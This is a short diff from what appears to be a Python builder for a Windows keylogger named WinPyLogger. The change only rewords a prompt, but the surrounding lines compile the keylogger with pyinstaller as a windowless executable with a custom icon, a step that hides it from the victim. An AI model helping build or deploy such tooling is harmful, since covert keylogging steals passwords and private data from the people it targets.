@@ -43,7 +43,7 @@ try:
         print('Want to use the default icon? y/n')
         command_2 = input('WinPyLogger> ')
         if command_2 == 'y':
-            name_keylogger = input("Name of the keylogger file (don't mention the extension): ")
+            name_keylogger = input("Name the keylogger file (don't mention the extension): ")
             os.system(f'pyinstaller --onefile utils.py --noconsole --icon=imgs\icon.ico --name {name_keylogger}')   
             print(greeting)
             print('The keylogger is saved in WinPyLogger/dist')
